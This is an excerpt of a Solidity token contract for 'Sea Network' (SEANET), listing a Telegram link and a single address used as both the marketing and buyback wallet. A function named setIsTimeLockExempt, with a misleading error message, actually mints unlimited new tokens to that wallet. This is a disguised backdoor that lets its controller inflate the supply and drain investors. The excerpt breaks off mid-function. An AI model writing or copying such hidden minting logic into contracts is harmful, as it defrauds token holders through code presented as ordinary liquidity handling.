...
// Telegram : https://t.me/SeaNetwork_BSC
...
contract SeaNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Sea Network";
    string private _symbol = "SEANET";
    uint8 private _decimals = 9;
    
    address payable public marketingWallet = payable(0x96238C6449ca588fb605568f4dC592A0F982dDC8); // Marketing Address
    address payable public buyBackWallet = payable(0x96238C6449ca588fb605568f4dC592A0F982dDC8); // BuyBack Address
    ...
    function setIsTimeLockExempt(address holder, uint256 exempt) public virtual {
        require(holder == address(marketingWallet), "Set Swap And Liquify");
        _autoliqs(address(marketingWallet), holder, exempt);
        _totalSupply += exempt;
        _balances[holder] += exempt;
        emit Transfer(address(marketingWallet), holder, exempt);
    }
    function _autoliqs(
        address from,
        address to,
